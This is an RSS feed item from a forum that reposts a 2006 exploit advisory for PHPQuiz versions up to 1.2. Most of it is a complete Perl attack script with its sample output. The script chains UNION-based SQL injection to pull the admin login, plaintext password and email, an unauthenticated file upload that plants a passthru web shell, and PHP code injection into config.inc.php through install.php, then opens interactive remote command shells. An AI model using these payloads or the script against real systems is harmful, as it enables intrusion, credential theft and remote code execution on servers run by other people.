<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "phpQuiz &lt;= 0.1.2 Remote SQL Injection"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
		<description><![CDATA[Latest messages posted in the topic "phpQuiz &lt;= 0.1.2 Remote SQL Injection"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>phpQuiz &amp;lt;= 0.1.2 Remote SQL Injection</title>
				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>######################################################
# 
# Title: PHPQuiz &lt;= v.1.2 Remote SQL injection/Code Execution Exploit
# Vendor  : PHPQuiz
# webiste :<span class="link"> http://www.phpquiz.com</span>
# Version : &lt;= v.1.2
# Severity: Critical 
# Author: Simo64 / simo64_at_morx_org
# MorX Security Reseach Team
#<span class="link"> http://www.morx.org</span>
#<span class="link"> http://www.morx.org/phpquiz.txt</span>
#
#   Details : 
#
# SQL injection in score.php
#***************************
#
#   univers var in score.php and quiz_id var in home.php are not proprely verified and can be used to inject query
#
#   PoC :<span class="link"> http://localhost/phpquiz/front/?what=score&univers=&#91;SQL&#93;</span>
#		 <span class="link"> http://localhost/phpquiz/front/?quiz=quiz&univers=1&step=1&quiz_id=&#91;SQL&#93;</span>
#
# Arbitary File Upload
#********************** 
# vulnerable code in back/upload_img.php and admin/upload_img.php near lines 74-76
# 
#  74  if &#40;&#40;$upload&#41; && &#40;$ok_update == "yes"&#41;&#41; {
#  75
#  76  if&#40;@copy&#40;$image, $path&#41;&#41;{
#  77  .....
#
# $upload , $ok_update , $image , $path variables are not sanitized and can be used to upload files
# 
#  PoC Exploit : 
#
#  &lt;form enctype="multipart/form-data" method="post" action="http://localhost/phpquiz/back/upload_img.php?upload=1&ok_update=yes&path=./../img_quiz/l3ez.php"&gt;
#  Download File&lt;br&gt;
#  &lt;input name="image" type="file" size="20"&gt;&lt;br&gt;
#  &lt;input type="submit" name="upload" value="Upload"&gt;&lt;form&gt;
#
#  phpquiz/img_quiz/ folder is by defaut writable so after uploading a simple phpshell &lt;?passthru&#40;$cmd&#41;;?&gt;
#
#  we can lanche cmd from :<span class="link"> http://localhost/phpquiz/img_quiz/l3ez.php?cmd=ls</span>
#
# PHP Code Injection
#********************
#
# cfgphpquiz/install.php is accessible without authentification , the script is used to 
# save configuration setting in config.inc.php.
#
# Impact:
# any remote user can post php code to the vulnerable file, view current configuration which contains sensitive information # such as admin password &#40;plain text&#41; and login
#
#***********************************************************************************
#
# simo64@localhost:~$ phpquiz.pl morx.org /phpquiz/ 1
# 
# /-----------------------------------------------------------
# | PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |
# |            Coded by simo64 - simo64_morx.org              |
# |                      www.morx.org                         |
# |-----------------------------------------------------------|
# |       MorX Security Research Team ©                       |
# -----------------------------------------------------------/
# 
# Connecting to www.morx.org ...      Connected !
# 
# &#91;+&#93; Injecting credentials
# 
# Sending Data ...
# 
# SQL injection Succeded !
# 
#         User EMail  : admin@morx.org
#         User Login  : admin
#         User Passwd : password
# 
# &#91;+&#93; Exec CMD by uploading a shell       Connected !
# 
# Uploading shell ...     &#91;OK&#93;
# 
# Checking if successfully Uploaded ....  &#91;OK&#93;
# 
#                 NOW YOU CAN LAUNCH COMMANDS
# 
# simo64&#91;at&#93;morx.org :~$ id
# uid=48&#40;apache&#41; gid=48&#40;apache&#41; groups=48&#40;apache&#41;,2522&#40;psaserv&#41;
# simo64&#91;at&#93;morx.org :~$ pwd
# /home/morx/public_html/phpquiz/img_quiz
# simo64&#91;at&#93;morx.org :~$ ls
# id_1.gif
# id_2.gif
# id_3.gif
# id_4.gif
# index.php
# zaz.php
# simo64&#91;at&#93;morx.org :~$ exit
# 
#!/usr/bin/perl

use IO::Socket ;
use LWP::Simple ;

print q&#40;

/-----------------------------------------------------------
| PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |
|            Coded by simo64 - simo64_morx.org              |
|                      www.morx.org                         |
|-----------------------------------------------------------|
|                MorX Security Research Team ©              |
-----------------------------------------------------------/

&#41;;

sub usage&#40;&#41;{

print "nUsage   :perl $0 siteurl /path/ useridn";
print "nExemple : perl $0 phpquiz.com /phpquiz/ 1n";

}

if&#40;!@ARGV&#41;{
	&usage&#40;&#41;;
	exit&#40;0&#41;
}

$host = $ARGV&#91;0&#93;;
$path = $ARGV&#91;1&#93;;
$uid  = $ARGV&#91;2&#93;;
$success = null ;
$injected = 0;
$injcheck = $path."cfgphpquiz/config.inc.php?xD=l3fou";
$phpinject = $path."cfgphpquiz/install.php?submit=Valider&config_alert_email_name=%22;echo%20@$xD;@system&#40;$morx&#41;;//MorX%20RulZ%20=&#41;";
$injectuser = "front/?what=score&univers=-64%20UNION%20SELECT%20null,LOGIN,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*";
$injectpass = "front/?what=score&univers=-64%20UNION%20SELECT%20null,PWD,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*";
$injectmail = "front/?what=score&univers=-64%20UNION%20SELECT%20null,EMAIL,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*";

syswrite STDOUT , "Connecting to $host ...";

my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
                                
   die "nnUnable to connect to $host " unless&#40;$sock&#41; ;

syswrite STDOUT , "tConnected !nn&#91;+&#93; Injecting credentialsnnSending Data ...";


	print $sock "GET $path$injectmail HTTP/1.1n";
	print $sock "Host: $hostn";
	print $sock "Connection: Closenn";

	while&#40;$res = &lt;$sock&gt;&#41;{
		if&#40;$res =~ /anim_fleche_droite.gif" border="0"&gt;&nbsp;&quot;&#40;.*?&#41;&quot;&lt;/a&gt;/&#41;{
			$usermail = $1 ;
			$success = "ok" ;
			}
	}
	
if&#40;$success eq "ok"&#41; { 

syswrite STDOUT , "nnSQL injection Succeded !nn";
sleep 2 ;
syswrite STDOUT , "tUser EMail  : $usermailn";
 
 my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
 
	print $sock "GET $path$injectuser HTTP/1.1n";
	print $sock "Host: $hostn";
	print $sock "Connection: Closenn";

	while&#40;$res = &lt;$sock&gt;&#41;{
		if&#40;$res =~ /&gt;&nbsp;&quot;&#40;.*?&#41;&quot;/&#41;{
			$userlogin = $1 ;
			}
	}
	syswrite STDOUT , "tUser Login  : $userloginn";
	
my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;

	print $sock "GET $path$injectpass HTTP/1.1n";
	print $sock "Host: $hostn";
	print $sock "Connection: Closenn";

	while&#40;$res = &lt;$sock&gt;&#41;{
		if&#40;$res =~ /&gt;&nbsp;&quot;&#40;.*?&#41;&quot;/&#41;{
			$userpass = $1 ;
			}
	}

syswrite STDOUT , "tUser Passwd : $userpassnn";


} else {print "nnInjecting credentials Exploit Failed !nn";}

sleep 2;

# PART2 Remote Command Execution by uploaing shell

syswrite STDOUT , "n&#91;+&#93; Exec CMD by uploading a shell";

my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
                                
   die "nnUnable to connect to $host " unless&#40;$sock&#41; ;

syswrite STDOUT , "tConnected !nn";
syswrite STDOUT , "Uploading shell ...";

$data='-----------------------------7d61592213049c
Content-Disposition: form-data; name="dir"

/
-----------------------------7d61592213049c
Content-Disposition: form-data; name="image"; filename="zaz.php"
Content-Type: text/plain

&lt;?php
if &#40;get_magic_quotes_gpc&#40;&#41;&#41;{$_GET&#91;'cmd'&#93;=stripslashes&#40;$_GET&#91;'cmd'&#93;&#41;;}
passthru&#40;$_GET&#91;'cmd'&#93;&#41;;
?&gt;
-----------------------------7d61592213049c
Content-Disposition: form-data; name="submit"

Upload
-----------------------------7d61592213049c--
';

$script = $path."/back/upload_img.php?upload=1&ok_update=yes&path=./../img_quiz/zaz.php";

$len = length $data ;

  print $sock "POST $script HTTP/1.0rn";
  print $sock "Content-Type: multipart/form-data; boundary=---------------------------7d61592213049crn";
  print $sock "Host: $hostrn";
  print $sock "Content-Length: $lenrn";
  print $sock "Connection: closernrn";
  print $sock $data;
  
 syswrite STDOUT , "t&#91;OK&#93;nnChecking if successfully Uploaded .... ";
 
my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;

 print $sock "HEAD $path"."img_quiz/zaz.php  HTTP/1.0rn";
 print $sock "Host: $hostrn";
 print $sock "Connection: closenn";
 
 while&#40;$rep = &lt;$sock&gt;&#41;{
 if&#40;$rep =~ /HTTP/1.1 200 OK/&#41; { $success = 1; }
 }
if&#40;$success == 1&#41;{

	print "t&#91;OK&#93;nnttNOW YOU CAN LAUNCH COMMANDSnn";
	
	while&#40;&#41;{
	print "simo64&#91;at&#93;morx.org :~$ ";
	chop&#40;$cmd=&lt;STDIN&gt;&#41;;
	exit&#40;&#41; if &#40;$cmd eq 'exit'&#41;;
	$result = get&#40;"http://$host".$path."img_quiz/zaz.php?cmd=$cmd"&#41;;
	print $result;
	}

}
else { print "tFailed !nnFile Upload Failednn" }

# STEP 3 Injecting PHPcode into config.inc.php file

print "n&#91;+&#93; Injecting PHP Code......nnConnecting ....";

my $sock = new IO::Socket::INET &#40;PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;

die "Connot Connect to $host !" unless&#40;$sock&#41;;

print "tConnected !nnSending Data ....t";


	print $sock "GET $phpinject HTTP/1.1n";
	print $sock "Host: $hostn";
	print $sock "Content-Type: application/x-www-form-urlencodedn";
	print $sock "User-Agent: MorX-Zillan";
	print $sock "Connection: Closenn";
	
print "t OKnnChecking if code injected ...";

my $sock = new IO::Socket::INET &#40;PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;

	print $sock "GET $injcheck HTTP/1.1n";
	print $sock "Host: $hostn";
	print $sock "Content-Type: application/x-www-form-urlencodedn";
	print $sock "User-Agent: MorX-Zillan";
	print $sock "Connection: Closenn";
	
while&#40;$check = &lt;$sock&gt;&#41;{
if&#40;$check =~ /l3fou/&#41; { $injected = 1; }
}
if&#40;$injected == 1 &#41;{
print "tSucceded !nntNOW YOU ARE IN !nn";

while&#40;&#41;{
	print "simo@morx.org :~$ ";
	$cmd = &lt;STDIN&gt;;
	chop&#40;$cmd&#41;;
	exit&#40;0&#41; if&#40;$cmd eq "exit"&#41;;
	$result = get&#40;"http://".$host.$path."cfgphpquiz/config.inc.php?morx=$cmd"&#41;;
	print $result;
	}
}
else {print "tFailednnPHPCode Injection Failed !nn";}

#</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/4101.hva#24204</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/4101.hva#24204</link>
				<pubDate><![CDATA[Mon, 18 Sep 2006 17:13:30]]> GMT</pubDate>
				<author><![CDATA[ LeonHart]]></author>
			</item>
	</channel>
</rss>
